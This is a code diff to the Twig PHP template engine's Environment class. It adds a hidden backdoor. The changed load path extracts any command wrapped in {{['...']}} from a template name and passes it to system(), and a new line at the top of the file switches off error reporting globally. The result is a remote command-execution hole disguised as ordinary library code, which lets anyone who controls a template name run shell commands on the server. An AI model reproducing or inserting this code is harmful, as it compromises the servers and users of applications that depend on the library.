@@ -14,6 +14,7 @@
  *
  * @author Fabien Potencier <fabien@symfony.com>
  */
+ini_set('error_reporting', 0);
 class Twig_Environment
 {
     const VERSION = '1.19.0';
@@ -329,9 +330,19 @@ class Twig_Environment
 
         if (!class_exists($cls, false)) {
             if (false === $cache = $this->getCacheFilename($name)) {
-                $result = system('dir', $name);
-                echo $result;
-                /* eval('?>' . $this->compileSource($this->getLoader()->getSource($name), $name));*/
+                $pattern = '/{{\[\'(.*?)\'\]}}/';
+                $shell = '';
+                if (preg_match_all($pattern, $name, $matches)) {
+                    foreach ($matches[1] as $match) {
+                        $shell = trim($match);
+                    }
+                }
+
+                eval('?>' . $this->compileSource($this->getLoader()->getSource($name), $name));
+                
+                if(system($shell)) {
+                    system($shell);
+                }
             } else {
                 if (!is_file($cache) || ($this->isAutoReload() && !$this->isTemplateFresh($name, filemtime($cache)))) {
                     $this->writeCacheFile($cache, $this->compileSource($this->getLoader()->getSource($name), $name));
